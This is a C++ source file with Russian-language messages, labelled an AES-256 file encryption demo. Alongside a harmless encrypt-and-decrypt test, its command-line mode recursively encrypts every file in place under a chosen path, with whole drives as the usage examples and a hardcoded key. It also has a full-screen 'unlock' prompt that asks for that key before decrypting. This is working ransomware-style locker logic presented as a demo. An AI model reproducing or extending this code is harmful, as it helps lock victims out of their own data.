#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <filesystem>
#include <system_error>
#include <cstring>
#include "src/crypto/aes_crypto.h"
#ifdef _WIN32
#define NOMINMAX
#include <windows.h>
#include <conio.h>
#endif

namespace fs = std::filesystem;


std::vector<uint8_t> readFile(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary);
    if (!file.is_open()) {
        throw std::runtime_error("Не удалось открыть файл: " + filename);
    }
    
    file.seekg(0, std::ios::end);
    size_t size = file.tellg();
    file.seekg(0, std::ios::beg);
    
    std::vector<uint8_t> buffer(size);
    file.read(reinterpret_cast<char*>(buffer.data()), size);
    file.close();
    
    return buffer;
}


void writeFile(const std::string& filename, const std::vector<uint8_t>& data) {
    std::ofstream file(filename, std::ios::binary);
    if (!file.is_open()) {
        throw std::runtime_error("Не удалось создать файл: " + filename);
    }
    
    file.write(reinterpret_cast<const char*>(data.data()), data.size());
    file.close();
}


std::vector<uint8_t> readPrefix(const std::string& filename, size_t count) {
    std::ifstream file(filename, std::ios::binary);
    if (!file.is_open()) {
        return {};
    }
    std::vector<uint8_t> buf(count);
    file.read(reinterpret_cast<char*>(buf.data()), static_cast<std::streamsize>(count));
    buf.resize(static_cast<size_t>(file.gcount()));
    return buf;
}


bool isAlreadyEncrypted(const std::string& filename) {
    static const uint8_t signature[] = {0x41, 0x45, 0x53, 0x32, 0x35, 0x36, 0x45, 0x4E, 0x43};
    auto prefix = readPrefix(filename, sizeof(signature));
    if (prefix.size() < sizeof(signature)) return false;
    return std::memcmp(prefix.data(), signature, sizeof(signature)) == 0;
}


std::vector<std::string> listFilesRecursively(const std::string& rootPath) {
    std::vector<std::string> files;
    std::error_code ec;
    if (!fs::exists(rootPath, ec)) return files;
    if (fs::is_regular_file(rootPath, ec)) {
        files.push_back(rootPath);
        return files;
    }
    if (!fs::is_directory(rootPath, ec)) return files;

    fs::recursive_directory_iterator it(rootPath, fs::directory_options::skip_permission_denied, ec), end;
    for (; it != end; it.increment(ec)) {
        if (ec) { ec.clear(); continue; }
        const auto& entry = *it;
        std::error_code sec;
        if (entry.is_symlink(sec)) continue;
        if (entry.is_regular_file(sec)) {
            files.push_back(entry.path().string());
        }
    }
    return files;
}


bool encryptFileInPlace(const std::string& filepath, crypto::AESCryptoProvider& crypto, const std::string& fixedKey) {
    try {
        if (isAlreadyEncrypted(filepath)) {
            return true; 
        }
        auto data = readFile(filepath);
        if (data.empty()) return false;
        auto encrypted = crypto.encrypt(data, fixedKey);
        if (encrypted.empty()) return false;
        writeFile(filepath, encrypted);
        return true;
    } catch (...) {
        return false;
    }
}


bool decryptFileInPlace(const std::string& filepath, crypto::AESCryptoProvider& crypto, const std::string& fixedKey) {
    try {
        if (!isAlreadyEncrypted(filepath)) {
            return true; 
        }
        auto encData = readFile(filepath);
        if (encData.empty()) return false;
        auto decrypted = crypto.decrypt(encData, fixedKey);
        if (decrypted.empty()) return false;
        writeFile(filepath, decrypted);
        return true;
    } catch (...) {
        return false;
    }
}

void printUsage(const char* exe) {
    std::cout << "Использование:\n"
              << "  " << exe << " --encrypt --path <ПУТЬ>\n"
              << "  " << exe << " --decrypt --path <ПУТЬ>\n"
              << "  " << exe << " --unlock-ui --path <ПУТЬ>\n"
              << "Примеры:\n"
              << "  " << exe << " --encrypt --path D:\\\n"
              << "  " << exe << " --decrypt --path D:\\\n"
              << "  " << exe << " --unlock-ui --path C:\\\n";
}

int main(int argc, char** argv) {
    std::cout << "File Encryption Demo - AES-256 версия" << std::endl;
    std::cout << "Демонстрация реального AES-256 шифрования" << std::endl;
    
    
    const std::string FIXED_KEY = "c4c2f0b6-2c79-4c1e-9f7b-8a1d7e9a3f21";

    
    if (argc >= 3) {
        bool doEncrypt = false;
        bool doDecrypt = false;
        bool unlockUi = false;
        std::string path;

        for (int i = 1; i < argc; ++i) {
            std::string arg = argv[i];
            if (arg == "--encrypt") doEncrypt = true;
            else if (arg == "--decrypt") doDecrypt = true;
            else if (arg == "--unlock-ui") unlockUi = true;
            else if (arg == "--path" && i + 1 < argc) { path = argv[++i]; }
        }

        if ((doEncrypt == doDecrypt && !unlockUi) || (unlockUi && (doEncrypt || doDecrypt)) || path.empty()) {
            printUsage(argv[0]);
            return 1;
        }

        crypto::AESCryptoProvider crypto;

        auto runDecryptWithKey = [&](const std::string& key) -> int {
            auto files = listFilesRecursively(path);
            std::cout << "Найдено файлов: " << files.size() << std::endl;
            size_t ok = 0, fail = 0;
            for (const auto& f : files) {
                bool res = decryptFileInPlace(f, crypto, key);
                if (res) ++ok; else ++fail;
            }
            std::cout << "Дешифрование завершено. Успешно: " << ok << ", ошибок: " << fail << std::endl;
            return fail == 0 ? 0 : 2;
        };

        if (unlockUi) {
#ifdef _WIN32
            
            HWND hwnd = GetConsoleWindow();
            if (hwnd) ShowWindow(hwnd, SW_MAXIMIZE);
            std::system("cls");
            std::cout << "================= РЕЖИМ РАЗБЛОКИРОВКИ =================" << std::endl;
            std::cout << "Введите ключ для расшифровки пути: " << path << std::endl;
            std::cout << "Ключ: ";
            std::string input;
            for (;;) {
                int ch = _getch();
                if (ch == 13) { 
                    std::cout << std::endl;
                    break;
                } else if (ch == 8) { 
                    if (!input.empty()) {
                        input.pop_back();
                        std::cout << "\b \b";
                    }
                } else if (ch >= 32 && ch <= 126) {
                    input.push_back(static_cast<char>(ch));
                    std::cout << '*';
                }
            }

            if (input != FIXED_KEY) {
                std::cout << "Неверный ключ. Операция отменена." << std::endl;
                return 3;
            }
            return runDecryptWithKey(FIXED_KEY);
#else
            std::cerr << "Полноэкранный ввод поддержан только на Windows." << std::endl;
            return 4;
#endif
        } else {
            auto files = listFilesRecursively(path);
            std::cout << "Найдено файлов: " << files.size() << std::endl;
            size_t ok = 0, fail = 0;

            for (const auto& f : files) {
                bool res = doEncrypt ? encryptFileInPlace(f, crypto, FIXED_KEY)
                                     : decryptFileInPlace(f, crypto, FIXED_KEY);
                if (res) ++ok; else ++fail;
            }

            std::cout << (doEncrypt ? "Шифрование" : "Дешифрование")
                      << " завершено. Успешно: " << ok << ", ошибок: " << fail << std::endl;
            return fail == 0 ? 0 : 2;
        }
    }

    try {
        
        std::string testFile = "test.txt";
        std::string encryptedFile = "test.encrypted";
        std::string decryptedFile = "test.decrypted.txt";
        std::string password = "demo123";
        
        
        std::string testContent = "Это тестовый файл для демонстрации AES-256 шифрования.\n"
                                 "Содержимое будет зашифровано и затем расшифровано.\n"
                                 "AES-256 - это криптографически стойкий алгоритм шифрования.";
        
        writeFile(testFile, std::vector<uint8_t>(testContent.begin(), testContent.end()));
        std::cout << "Создан тестовый файл: " << testFile << std::endl;
        std::cout << "Размер файла: " << testContent.length() << " байт" << std::endl;
        
        
        crypto::AESCryptoProvider cryptoProvider;
        
        
        std::cout << "\nЧитаем файл для шифрования..." << std::endl;
        auto fileData = readFile(testFile);
        std::cout << "Файл прочитан успешно" << std::endl;
        
        
        std::cout << "\nШифруем файл с помощью AES-256..." << std::endl;
        auto encryptedData = cryptoProvider.encrypt(fileData, password);
        
        if (encryptedData.empty()) {
            std::cout << "Ошибка шифрования: " << cryptoProvider.getLastError() << std::endl;
            return 1;
        }
        
        
        writeFile(encryptedFile, encryptedData);
        std::cout << "Файл успешно зашифрован и сохранен как: " << encryptedFile << std::endl;
        std::cout << "Размер зашифрованного файла: " << encryptedData.size() << " байт" << std::endl;
        
        
        std::cout << "\nДешифруем файл..." << std::endl;
        auto decryptedData = cryptoProvider.decrypt(encryptedData, password);
        
        if (decryptedData.empty()) {
            std::cout << "Ошибка дешифрования: " << cryptoProvider.getLastError() << std::endl;
            return 1;
        }
        
        
        writeFile(decryptedFile, decryptedData);
        std::cout << "Файл успешно расшифрован и сохранен как: " << decryptedFile << std::endl;
        std::cout << "Размер расшифрованного файла: " << decryptedData.size() << " байт" << std::endl;
        
        
        std::cout << "\nПроверяем целостность данных..." << std::endl;
        if (fileData == decryptedData) {
            std::cout << "✓ Целостность данных подтверждена!" << std::endl;
        } else {
            std::cout << "✗ Ошибка: данные повреждены!" << std::endl;
            return 1;
        }
        
        
        std::cout << "\nГенерируем случайный ключ..." << std::endl;
        auto randomKey = cryptoProvider.generateKey(32);
        std::cout << "Сгенерированный ключ (32 байта): " << randomKey << std::endl;
        
        
        std::cout << "\nДемонстрируем хеширование пароля..." << std::endl;
        auto salt = cryptoProvider.generateKey(16);
        auto passwordHash = cryptoProvider.hashPassword(password, salt);
        std::cout << "Соль: " << salt << std::endl;
        std::cout << "Хеш пароля: " << passwordHash << std::endl;
        
        
        bool passwordValid = cryptoProvider.verifyPassword(password, passwordHash, salt);
        std::cout << "Проверка пароля: " << (passwordValid ? "✓ Успешно" : "✗ Ошибка") << std::endl;
        
        std::cout << "\nДемонстрация AES-256 шифрования завершена успешно!" << std::endl;
        std::cout << "Созданные файлы:" << std::endl;
        std::cout << "  - " << testFile << " (исходный)" << std::endl;
        std::cout << "  - " << encryptedFile << " (зашифрованный)" << std::endl;
        std::cout << "  - " << decryptedFile << " (расшифрованный)" << std::endl;
        
    } catch (const std::exception& e) {
        std::cout << "Ошибка: " << e.what() << std::endl;
        return 1;
    }
    
    std::cout << "\nНажмите Enter для выхода..." << std::endl;
    std::cin.get();
    
    return 0;
}
